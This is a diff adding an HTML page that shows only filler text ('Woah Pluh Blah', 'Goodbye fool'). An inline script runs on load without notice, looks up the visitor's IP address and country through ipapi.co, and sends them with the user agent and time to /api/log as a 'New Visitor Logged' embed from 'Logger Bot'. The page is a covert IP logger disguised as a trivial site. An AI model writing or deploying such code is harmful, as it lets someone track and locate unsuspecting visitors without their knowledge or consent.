@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Some Simple Coding</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+  <div class="card">
+    <h1>Woah Pluh Blah</h1>
+    <p>Goodbye fool</p>
+  </div>
+
+  <script>
+    async function getIPInfo() {
+      try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const data = await ipRes.json();
+
+        const ip = data.ip;
+        const country = data.country_name;
+        const countryCode = data.country_code;
+        const flag = countryCode ? `:flag_${countryCode.toLowerCase()}:` : "🏳️";
+        const userAgent = navigator.userAgent;
+        const timestamp = new Date().toLocaleString();
+
+        const embed = {
+          title: "🌐 New Visitor Logged",
+          color: 3447003,
+          fields: [
+            { name: "IP Address", value: `\`${ip}\``, inline: false },
+            { name: "Country", value: `${flag} ${country}`, inline: true },
+            { name: "User Agent", value: `\`${userAgent}\``, inline: false },
+            { name: "Time", value: timestamp, inline: false }
+          ]
+        };
+
+        await fetch("/api/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Logger Bot",
+            embeds: [embed]
+          })
+        });
+      } catch (err) {
+        console.error("Logging failed:", err);
+      }
+    }
+
+    getIPInfo();
+  </script>
+</body>
+</html>
